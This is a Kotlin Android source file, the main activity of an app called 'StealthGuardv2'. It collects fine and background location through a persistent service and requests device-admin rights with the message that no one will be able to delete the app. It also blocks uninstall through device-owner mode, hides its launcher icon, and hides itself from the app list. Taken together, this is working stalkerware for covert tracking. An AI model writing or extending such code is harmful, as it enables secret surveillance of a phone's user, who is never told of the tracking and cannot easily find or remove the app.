package com.stealthguardv2

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private val alias get() = ComponentName(this, "$packageName.LauncherAlias")
    private val admin get() = ComponentName(this, MyDeviceAdmin::class.java)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        tvStatus = findViewById(R.id.tvStatus)

        findViewById<Button>(R.id.btnPerms).setOnClickListener { askPerms() }
        findViewById<Button>(R.id.btnAdmin).setOnClickListener { askAdmin() }
        findViewById<Button>(R.id.btnBattery).setOnClickListener { askBattery() }
        findViewById<Button>(R.id.btnStart).setOnClickListener { startSvc() }
        findViewById<Button>(R.id.btnStop).setOnClickListener {
            stopService(Intent(this, StealthService::class.java)); refresh()
        }
        findViewById<Button>(R.id.btnBlock).setOnClickListener { blockUninstall() }
        findViewById<Button>(R.id.btnHideIcon).setOnClickListener { toggleIcon() }
        findViewById<Button>(R.id.btnHideApp).setOnClickListener { toggleAppHidden() }

        askPerms()
        if (granted(Manifest.permission.ACCESS_FINE_LOCATION)) startSvc()
    }

    override fun onResume() { super.onResume(); refresh() }

    private fun granted(p: String) =
        checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED

    private fun toast(s: String) = Toast.makeText(this, s, Toast.LENGTH_SHORT).show()

    private fun refresh() {
        val dpm = getSystemService(DevicePolicyManager::class.java)
        tvStatus.text = """
            Device Admin    : ${dpm?.isAdminActive(admin) == true}
            Device Owner    : ${dpm?.isDeviceOwnerApp(packageName) == true}
            Icon hidden     : ${!launcherEnabled()}
            App list hidden : ${dpm?.isApplicationHidden(admin, packageName) == true}
            Service         : ${if (StealthService.isRunning) "RUNNING" else "stopped"}
            Last location   : ${StealthService.lastText}
        """.trimIndent()
    }

    private fun startSvc() {
        val i = Intent(this, StealthService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
        else startService(i)
        tvStatus.postDelayed({ refresh() }, 800)
    }

    private fun askPerms() {
        val list = mutableListOf<String>()
        if (!granted(Manifest.permission.ACCESS_FINE_LOCATION)) {
            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= 33 && !granted(Manifest.permission.POST_NOTIFICATIONS)) {
            list.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (list.isNotEmpty()) ActivityCompat.requestPermissions(this, list.toTypedArray(), 100)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            if (Build.VERSION.SDK_INT >= 29 &&
                !granted(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                ActivityCompat.requestPermissions(
                    this, arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 101
                )
            }
            startSvc()
        }
        refresh()
    }

    private fun askAdmin() {
        startActivity(
            Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                .putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Isse app ko koi delete nahi kar payega"
                )
        )
    }

    private fun askBattery() {
        val pm = getSystemService(PowerManager::class.java)
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            startActivity(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName"))
            )
        } else toast("Battery already unrestricted")
    }

    private fun blockUninstall() {
        val dpm = getSystemService(DevicePolicyManager::class.java) ?: return
        if (!dpm.isDeviceOwnerApp(packageName)) {
            toast("Pehle Device Owner set karo (Termux se)")
            return
        }
        dpm.setUninstallBlocked(admin, packageName, true)
        toast("Uninstall block ho gaya - ab delete nahi hoga")
        refresh()
    }

    private fun launcherEnabled(): Boolean =
        packageManager.getComponentEnabledSetting(alias) !=
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED

    private fun toggleIcon() {
        val enable = !launcherEnabled()
        packageManager.setComponentEnabledSetting(
            alias,
            if (enable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        toast(if (enable) "Icon wapas" else "Icon gayab")
        refresh()
    }

    private fun toggleAppHidden() {
        val dpm = getSystemService(DevicePolicyManager::class.java) ?: return
        if (!dpm.isDeviceOwnerApp(packageName)) { toast("Device Owner chahiye"); return }
        val hidden = dpm.isApplicationHidden(admin, packageName)
        dpm.setApplicationHidden(admin, packageName, !hidden)
        toast(if (hidden) "App list me wapas" else "App list se bhi gayab")
        refresh()
    }
}
